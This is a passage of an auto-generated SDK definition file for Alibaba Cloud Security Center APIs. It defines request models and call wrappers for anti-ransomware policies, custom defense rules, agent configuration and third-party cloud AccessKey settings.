  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies an anti-ransomware policy.
 *
 * @param request ModifyBackupPolicyRequest
 * @return ModifyBackupPolicyResponse
 */
async function modifyBackupPolicy(request: ModifyBackupPolicyRequest): ModifyBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyWithOptions(request, runtime);
}

model ModifyBackupPolicyStatusRequest {
  id?: long(name='Id', description='The ID of the anti-ransomware policy.

This parameter is required.', example='30490'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0', deprecated=true),
  status?: string(name='Status', description='Specifies whether to enable or disable the anti-ransomware policy. Valid values:

*   **enabled**: enables the anti-ransomware policy. After you enable the anti-ransomware policy, the anti-ransomware feature protects data on your servers. Data on your servers is backed up based on the policy.
*   **disabled**: disables the anti-ransomware policy. After you disable the anti-ransomware policy, the data backup task that is running based on the policy stops.

>  When the system runs data backup tasks, your network bandwidth is consumed. We recommend that you enable the anti-ransomware policy during peak-off hours to back up data.

This parameter is required.', example='enabled'),
}

model ModifyBackupPolicyStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E342452B-4401-5F74-9A1B-D24479851173'),
}

model ModifyBackupPolicyStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyBackupPolicyStatusResponseBody(name='body'),
}

/**
 * @summary Enables or disables an anti-ransomware policy.
 *
 * @param request ModifyBackupPolicyStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyBackupPolicyStatusResponse
 */
async function modifyBackupPolicyStatusWithOptions(request: ModifyBackupPolicyStatusRequest, runtime: Util.RuntimeOptions): ModifyBackupPolicyStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBackupPolicyStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Enables or disables an anti-ransomware policy.
 *
 * @param request ModifyBackupPolicyStatusRequest
 * @return ModifyBackupPolicyStatusResponse
 */
async function modifyBackupPolicyStatus(request: ModifyBackupPolicyStatusRequest): ModifyBackupPolicyStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBackupPolicyStatusWithOptions(request, runtime);
}

model ModifyBinarySecurityPolicyRequest {
  clusters?: string(name='Clusters', description='Cluster information.

This parameter is required.', example='[{\\\\"Namespaces\\\\":[\\\\"default\\\\"],\\\\"ClusterId\\\\":\\\\"c9f5b93a8da8f4341b77***********\\\\"},{\\\\"Namespaces\\\\":[\\\\"default\\\\"],\\\\"ClusterId\\\\":\\\\"cc12429dbb8f644f690b0***********\\\\"}]'),
  name?: string(name='Name', description='Policy name.', example='test-policy-04-11'),
  policy?: string(name='Policy', description='Policy content. JSON format, Key values:
- **policyMode**: Type of policy, default is requireAttestor.
- **requiredAttestors**: Required attestors.

This parameter is required.', example='{\\\\"PolicyMode\\\\":\\\\"requireAttestor\\\\",\\\\"RequiredAttestors\\\\":[\\\\"test-xcs-04-11-hhht\\\\"]}'),
  remark?: string(name='Remark', description='Remark.', example='Remark'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The IP address of the access source.', example='1.2.3.4'),
  status?: string(name='Status', description='Set to enable or disable the policy. Values:

- **enabled**: Enable the protection policy.
- **disabled**: Disable the protection policy.', example='enabled'),
}

model ModifyBinarySecurityPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The request ID of the result.', example='C699E4E4-F2F4-58FC-A949-457FFE59****'),
}

model ModifyBinarySecurityPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyBinarySecurityPolicyResponseBody(name='body'),
}

/**
 * @summary Modify Policy
 *
 * @param request ModifyBinarySecurityPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyBinarySecurityPolicyResponse
 */
async function modifyBinarySecurityPolicyWithOptions(request: ModifyBinarySecurityPolicyRequest, runtime: Util.RuntimeOptions): ModifyBinarySecurityPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusters)) {
    query['Clusters'] = request.clusters;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.policy)) {
    query['Policy'] = request.policy;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyBinarySecurityPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modify Policy
 *
 * @param request ModifyBinarySecurityPolicyRequest
 * @return ModifyBinarySecurityPolicyResponse
 */
async function modifyBinarySecurityPolicy(request: ModifyBinarySecurityPolicyRequest): ModifyBinarySecurityPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyBinarySecurityPolicyWithOptions(request, runtime);
}

model ModifyCheckRuleRequest {
  addInstanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-wz9g8ljygfqs1ez3****'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-shanghai'),
    }
  ](name='AddInstanceList', description='The list of instances to be added in this rule update. This parameter does not need to be passed if there are no instances to add.'),
  deleteInstanceList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-8vb0e8qdaj0yyxjo****'),
      regionId?: string(name='RegionId', description='The region ID of the asset.', example='cn-shanghai'),
    }
  ](name='DeleteInstanceList', description='The list of instances to be removed in this rule update. This parameter does not need to be passed if there are no instances to remove.'),
  remark?: string(name='Remark', description='Remarks.', example='testRemark'),
  ruleId?: long(name='RuleId', description='Rule ID.
> You can obtain this parameter by calling the [ListCheckRule](https://help.aliyun.com/document_detail/2590599.html) API.

This parameter is required.', example='9000**'),
  ruleType?: string(name='RuleType', description='Rule type. Default is **WHITE**. Values:
- **WHITE**: Add to whitelist', example='WHITE'),
  scopeType?: string(name='ScopeType', description='The scope of effect for modifying the rule:
- **INSTANCE**: Instance
- **ITEM**: Check item', example='INSTANCE'),
}

model ModifyCheckRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for the request and can be used for troubleshooting and problem localization.', example='CD380235-A0B8-540D-A0D5-D6288446****'),
  ruleId?: string(name='RuleId', description='Rule ID.', example='123'),
}

model ModifyCheckRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyCheckRuleResponseBody(name='body'),
}

/**
 * @summary Modify the rule settings for cloud product configuration checks
 *
 * @param request ModifyCheckRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyCheckRuleResponse
 */
async function modifyCheckRuleWithOptions(request: ModifyCheckRuleRequest, runtime: Util.RuntimeOptions): ModifyCheckRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.addInstanceList)) {
    query['AddInstanceList'] = request.addInstanceList;
  }
  if (!Util.isUnset(request.deleteInstanceList)) {
    query['DeleteInstanceList'] = request.deleteInstanceList;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.ruleId)) {
    query['RuleId'] = request.ruleId;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.scopeType)) {
    query['ScopeType'] = request.scopeType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCheckRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modify the rule settings for cloud product configuration checks
 *
 * @param request ModifyCheckRuleRequest
 * @return ModifyCheckRuleResponse
 */
async function modifyCheckRule(request: ModifyCheckRuleRequest): ModifyCheckRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCheckRuleWithOptions(request, runtime);
}

model ModifyClearLogstoreStorageRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  userLogStore?: string(name='UserLogStore', description='The name of the Logstore that stores logs.', example='sas_sls_storage'),
  userProject?: string(name='UserProject', description='The name of the project.', example='sas-log-1234(uid)-cn-hangzhou'),
}

model ModifyClearLogstoreStorageResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DC84C453-8561-5EC4-B0E9-44E67ACCB5B5'),
}

model ModifyClearLogstoreStorageResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyClearLogstoreStorageResponseBody(name='body'),
}

/**
 * @summary Deletes all logs that occupy your log storage.
 *
 * @description Deleted logs cannot be restored. Before you call this operation to delete all logs and free up log storage, we recommend that you export and save your logs to your computer.
 *
 * @param request ModifyClearLogstoreStorageRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyClearLogstoreStorageResponse
 */
async function modifyClearLogstoreStorageWithOptions(request: ModifyClearLogstoreStorageRequest, runtime: Util.RuntimeOptions): ModifyClearLogstoreStorageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.userLogStore)) {
    query['UserLogStore'] = request.userLogStore;
  }
  if (!Util.isUnset(request.userProject)) {
    query['UserProject'] = request.userProject;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClearLogstoreStorage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Deletes all logs that occupy your log storage.
 *
 * @description Deleted logs cannot be restored. Before you call this operation to delete all logs and free up log storage, we recommend that you export and save your logs to your computer.
 *
 * @param request ModifyClearLogstoreStorageRequest
 * @return ModifyClearLogstoreStorageResponse
 */
async function modifyClearLogstoreStorage(request: ModifyClearLogstoreStorageRequest): ModifyClearLogstoreStorageResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClearLogstoreStorageWithOptions(request, runtime);
}

model ModifyClientConfSetupRequest {
  strategyConfig?: string(name='StrategyConfig', description='The configurations of the Security Center agent.

*   cpu: the maximum CPU utilization that can be occupied by the Security Center agent on the server
*   mem: the maximum memory usage that can be occupied by the Security Center agent on the server', example='{
      "cpu": "20"
}'),
  strategyTag?: string(name='StrategyTag', description='The type of the tag.

This parameter is required.', example='machineResource'),
  strategyTagValue?: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic

This parameter is required.', example='major'),
}

model ModifyClientConfSetupResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='60E24426-B910-5D7F-8B8B-3BCDC3FC****'),
}

model ModifyClientConfSetupResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyClientConfSetupResponseBody(name='body'),
}

/**
 * @summary Modifies the resource configurations of the Security Center agent.
 *
 * @param request ModifyClientConfSetupRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyClientConfSetupResponse
 */
async function modifyClientConfSetupWithOptions(request: ModifyClientConfSetupRequest, runtime: Util.RuntimeOptions): ModifyClientConfSetupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyConfig)) {
    query['StrategyConfig'] = request.strategyConfig;
  }
  if (!Util.isUnset(request.strategyTag)) {
    query['StrategyTag'] = request.strategyTag;
  }
  if (!Util.isUnset(request.strategyTagValue)) {
    query['StrategyTagValue'] = request.strategyTagValue;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfSetup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the resource configurations of the Security Center agent.
 *
 * @param request ModifyClientConfSetupRequest
 * @return ModifyClientConfSetupResponse
 */
async function modifyClientConfSetup(request: ModifyClientConfSetupRequest): ModifyClientConfSetupResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfSetupWithOptions(request, runtime);
}

model ModifyClientConfStrategyRequest {
  tag?: string(name='Tag', description='The key of the tag that is added to the agent configuration policy.

This parameter is required.', example='machineResource'),
  tagExt?: string(name='TagExt', description='The extended tag of the agent configuration policy.', example='auto'),
  tagValue?: string(name='TagValue', description='The value of the tag that is added to the agent configuration policy.

*   major
*   advanced
*   basic

This parameter is required.', example='advanced'),
  uuid?: string(name='Uuid', description='The UUID of the server that you want to query.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  uuids?: [ string ](name='Uuids', description='The UUID of the asset. You can specify a maximum of 500 UUIDs at a time.'),
}

model ModifyClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9089D0AB-835F-5663-AB5E-4FF646BB****'),
}

model ModifyClientConfStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyClientConfStrategyResponseBody(name='body'),
}

/**
 * @summary Modifies an agent configuration policy.
 *
 * @param request ModifyClientConfStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyClientConfStrategyResponse
 */
async function modifyClientConfStrategyWithOptions(request: ModifyClientConfStrategyRequest, runtime: Util.RuntimeOptions): ModifyClientConfStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.tagExt)) {
    query['TagExt'] = request.tagExt;
  }
  if (!Util.isUnset(request.tagValue)) {
    query['TagValue'] = request.tagValue;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientConfStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies an agent configuration policy.
 *
 * @param request ModifyClientConfStrategyRequest
 * @return ModifyClientConfStrategyResponse
 */
async function modifyClientConfStrategy(request: ModifyClientConfStrategyRequest): ModifyClientConfStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientConfStrategyWithOptions(request, runtime);
}

model ModifyClientUserDefineRuleRequest {
  actionType?: int32(name='ActionType', description='The action of the rule. Valid values:

*   **0**: allow
*   **1**: block

This parameter is required.', example='0'),
  cmdline?: string(name='Cmdline', description='The command line.', example='/usr/sbin/s****'),
  domain?: string(name='Domain', description='The domain name.', example='example.com'),
  filePath?: string(name='FilePath', description='The file path.', example='/etc/pam.d/su****'),
  IP?: string(name='IP', description='The IP address.', example='1.1.XX.XX'),
  id?: long(name='Id', description='The ID of the rule.

>  You can call the [ListClientUserDefineRules](~~ListClientUserDefineRules~~) operation to query the IDs of rules.

This parameter is required.', example='210****'),
  md5List?: string(name='Md5List', description='The hash values of processes.', example='aa5ee3ed4363c9d195a591a70281****,3e522d6f3bf5cf88bb77e9ff3d13****'),
  name?: string(name='Name', description='The name of the rule.', example='Rule\\\\*\\\\*\\\\*\\\\*'),
  newFilePath?: string(name='NewFilePath', description='The new file path after the file is renamed.', example='/etc/pam****'),
  parentCmdline?: string(name='ParentCmdline', description='The parent command line.', example='/usr/sbin/s****'),
  parentProcPath?: string(name='ParentProcPath', description='The path to the parent process.', example='C:/Windows/System32/cmd****'),
  platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux
*   **all**: all types', example='linux'),
  port?: int32(name='Port', description='The port number. This parameter is deprecated.', example='22'),
  portStr?: string(name='PortStr', description='The port number. Valid values: 1 to 65535.', example='80'),
  procPath?: string(name='ProcPath', description='The path to the process.', example='/root/1111/****', nullable=false),
  registryContent?: string(name='RegistryContent', description='The registry value.', example='SECOH-QAD****'),
  registryKey?: string(name='RegistryKey', description='The registry key.', example='HKEY_DYN_****'),
  type?: int32(name='Type', description='The type of the rule. Valid values:

*   **1**: Process hash
*   **2**: Command line
*   **3**: Process Network
*   **4**: File Read and Write
*   **5**: Operation on Registry
*   **6**: Dynamic-link Library Loading
*   **7**: File Renaming', example='2'),
}

model ModifyClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5cbb3c39-88ec-429a-be26-5d0f62cc****'),
}

model ModifyClientUserDefineRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyClientUserDefineRuleResponseBody(name='body'),
}

/**
 * @summary Modifies a custom defense rule.
 *
 * @param request ModifyClientUserDefineRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyClientUserDefineRuleResponse
 */
async function modifyClientUserDefineRuleWithOptions(request: ModifyClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): ModifyClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.actionType)) {
    query['ActionType'] = request.actionType;
  }
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.domain)) {
    query['Domain'] = request.domain;
  }
  if (!Util.isUnset(request.filePath)) {
    query['FilePath'] = request.filePath;
  }
  if (!Util.isUnset(request.IP)) {
    query['IP'] = request.IP;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.md5List)) {
    query['Md5List'] = request.md5List;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.newFilePath)) {
    query['NewFilePath'] = request.newFilePath;
  }
  if (!Util.isUnset(request.parentCmdline)) {
    query['ParentCmdline'] = request.parentCmdline;
  }
  if (!Util.isUnset(request.parentProcPath)) {
    query['ParentProcPath'] = request.parentProcPath;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.portStr)) {
    query['PortStr'] = request.portStr;
  }
  if (!Util.isUnset(request.procPath)) {
    query['ProcPath'] = request.procPath;
  }
  if (!Util.isUnset(request.registryContent)) {
    query['RegistryContent'] = request.registryContent;
  }
  if (!Util.isUnset(request.registryKey)) {
    query['RegistryKey'] = request.registryKey;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies a custom defense rule.
 *
 * @param request ModifyClientUserDefineRuleRequest
 * @return ModifyClientUserDefineRuleResponse
 */
async function modifyClientUserDefineRule(request: ModifyClientUserDefineRuleRequest): ModifyClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyClientUserDefineRuleWithOptions(request, runtime);
}

model ModifyCloudVendorAccountAKRequest {
  authIds?: string(name='AuthIds', description='The unique ID of the AccessKey pair.

>  You can call the [DescribeCloudVendorAccountAKList](~~DescribeCloudVendorAccountAKList~~) operation to query the unique ID.

This parameter is required.', example='2832'),
  authModules?: [ string ](name='AuthModules', description='The modules that are associated with the AccessKey pair. Valid values:

*   **HOST**: host.
*   **CSPM**: configuration assessment.
*   **SIEM**: Cloud Threat Detection and Response (CTDR).
*   **TRIAL**: log audit.

>  You can call the [GetSupportedModules](~~GetSupportedModules~~) operation to query the supported modules.'),
  domain?: string(name='Domain', description='The Active Directory (AD) domain. Valid values:

*   **china**
*   **global**

>  This parameter takes effect only when Vendor is set to Azure.', example='global'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
  regions?: [ string ](name='Regions', description='The regions that are examined during AccessKey pair authentication.

>  This parameter takes effect only when Vendor is set to AWS. You can call the [ListCloudVendorRegions](~~ListCloudVendorRegions~~) operation to query regions.'),
  secretId?: string(name='SecretId', description='The AccessKey ID.

>  If AkType is set to **primary**, you must set SecretId to the AccessKey ID of the third-party master account. If AkType is set to **sub**, you must set SecretId to the AccessKey ID of the third-party sub-account. This parameter value does not change for a **Microsoft Azure account**. For an Azure account, set this parameter to the **app ID** that is used for authentication.', example='S3D6c4O***'),
  secretKey?: string(name='SecretKey', description='The AccessKey secret.

>  If AkType is set to **primary**, you must set SecretKey to the AccessKey secret of the third-party master account. If AkType is set to **sub**, you must set SecretKey to the AccessKey secret of the third-party sub-account. This parameter value does not change for a **Microsoft Azure account**. For an Azure account, set this parameter to the **password** that is used for authentication.', example='AE6SLd****'),
  status?: int32(name='Status', description='The status of the AccessKey pair. Valid values:

*   **0**: enabled.
*   **1**: disabled.', example='0'),
  subscriptionIds?: [ string ](name='SubscriptionIds', description='The IDs of subscriptions.

>  This parameter takes effect only when Vendor is set to Azure.'),
  tenantId?: string(name='TenantId', description='The tenant ID.

>  This parameter takes effect only when Vendor is set to Azure.', example='95304a97-339b-4de5-9a7d-cdbffaf****'),
  vendorAuthAlias?: string(name='VendorAuthAlias', description='The name of the AccessKey pair.

>  The account information of the third-party cloud servers.', example='test'),
}

model ModifyCloudVendorAccountAKResponseBody = {
  data?: {
    akType?: string(name='AkType', description='The type of the account to which the AccessKey pair belongs. Valid values:

*   **primary**
*   **sub**', example='sub'),
    authId?: long(name='AuthId', description='The unique ID of the AccessKey pair.', example='2158'),
    authModules?: [ 
      {
        message?: string(name='Message', description='The error message of the module.', example='ak_domain_error'),
        module?: string(name='Module', description='The code of the module. Valid values:

*   **HOST**: host.
*   **CSPM**: configuration assessment.
*   **SIEM**: CTDR.
*   **TRIAL**: log audit.', example='HOST'),
        moduleAssetType?: string(name='ModuleAssetType', description='The type of the cloud asset that is associated with the module.', example='Module.'),
        moduleDisp?: string(name='ModuleDisp', description='The display name of the module.', example='Host'),
        moduleServiceStatus?: int32(name='ModuleServiceStatus', description='The service status of the module. Valid values:

*   **0**: being used.
*   **1**: exception occurred.
*   **2**: being validated.
*   **3**: validation timed out.', example='0'),
        moduleStatement?: string(name='ModuleStatement', description='The permission description of the module.', example='Host'),
      }
    ](name='AuthModules', description='The modules that are associated with the AccessKey pair.'),
    message?: string(name='Message', description='The error message of the AccessKey pair.', example='The IAM user is forbidden in the currently selected region'),
    secretId?: string(name='SecretId', description='The AccessKey ID.

>  If AkType is set to **primary**, the value of SecretId is AccessKey ID of the third-party master account. If AkType is set to **sub**, the value of SecretId is the AccessKey ID of the third-party sub-account. This parameter value does not change for a **Microsoft Azure account**. For an Azure account, this parameter value is the **app ID** that is used for authentication.', example='AE6SLd****'),
    serviceStatus?: int32(name='ServiceStatus', description='The service status of the AccessKey pair. Valid values:

*   **0**: being used.
*   **1**: exception occurred.
*   **2**: being validated.
*   **3**: validation timed out.', example='0'),
    status?: int32(name='Status', description='The status of the AccessKey pair. Valid values:

*   **0**: enabled.
*   **1**: disabled.', example='0'),
    vendor?: string(name='Vendor', description='The type of the cloud asset. Valid values:

*   **Tencent**: Tencent Cloud.
*   **HUAWEICLOUD**: Huawei Cloud.
*   **Azure**: Microsoft Azure.
*   **AWS**: Amazon Web Services (AWS).', example='Tencent'),
    vendorAuthAlias?: string(name='VendorAuthAlias', description='The name of the AccessKey pair.

>  The account information of the third-party cloud servers.', example='test'),
  }(name='Data', description='The information about the AccessKey pair that is added.'),
  requestId?: string(name='RequestId', description='The request ID.', example='6635CED5-4B20-5D2D-94EC-A1C8F9C****'),
}

model ModifyCloudVendorAccountAKResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyCloudVendorAccountAKResponseBody(name='body'),
}

/**
 * @summary Modifies the configuration of the AccessKey pair for a third-party account.
 *
 * @param request ModifyCloudVendorAccountAKRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyCloudVendorAccountAKResponse
 */
async function modifyCloudVendorAccountAKWithOptions(request: ModifyCloudVendorAccountAKRequest, runtime: Util.RuntimeOptions): ModifyCloudVendorAccountAKResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.authIds)) {
    query['AuthIds'] = request.authIds;
  }
  if (!Util.isUnset(request.authModules)) {
    query['AuthModules'] = request.authModules;
  }
  if (!Util.isUnset(request.domain)) {
    query['Domain'] = request.domain;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.regions)) {
    query['Regions'] = request.regions;
  }
  if (!Util.isUnset(request.secretId)) {
    query['SecretId'] = request.secretId;
  }
  if (!Util.isUnset(request.secretKey)) {
    query['SecretKey'] = request.secretKey;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.subscriptionIds)) {
    query['SubscriptionIds'] = request.subscriptionIds;
  }
  if (!Util.isUnset(request.tenantId)) {
    query['TenantId'] = request.tenantId;
  }
  if (!Util.isUnset(request.vendorAuthAlias)) {
    query['VendorAuthAlias'] = request.vendorAuthAlias;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCloudVendorAccountAK',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configuration of the AccessKey pair for a third-party account.
 *
 * @param request ModifyCloudVendorAccountAKRequest
 * @return ModifyCloudVendorAccountAKResponse
 */
async function modifyCloudVendorAccountAK(request: ModifyCloudVendorAccountAKRequest): ModifyCloudVendorAccountAKResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCloudVendorAccountAKWithOptions(request, runtime);
}

model ModifyCloudVendorTrialConfigRequest {
  authId?: long(name='AuthId', description='The ID of the audit log configuration to be modified.
> The ID can be queried via [DescribeCloudVendorAccountAKList](~~DescribeCloudVendorAccountAKList~~).

This parameter is required.', example='23**'),
  authInfo?: string(name='AuthInfo', description='Enter the multi-cloud configuration information:
- AWS: parameters sqsQueueName, sqsRegion
- Tencent: parameters kafkaUserName, kafkaBootstrapServers, kafkaTopic', example='{\\\\"sqsRegion\\\\":\\\\"us-west-2\\\\",\\\\"sqsQueueName\\\\":\\\\"****\\\\"}'),
  deleteTrail?: boolean(name='DeleteTrail', description='Whether to delete this audit log configuration:
- true: Delete
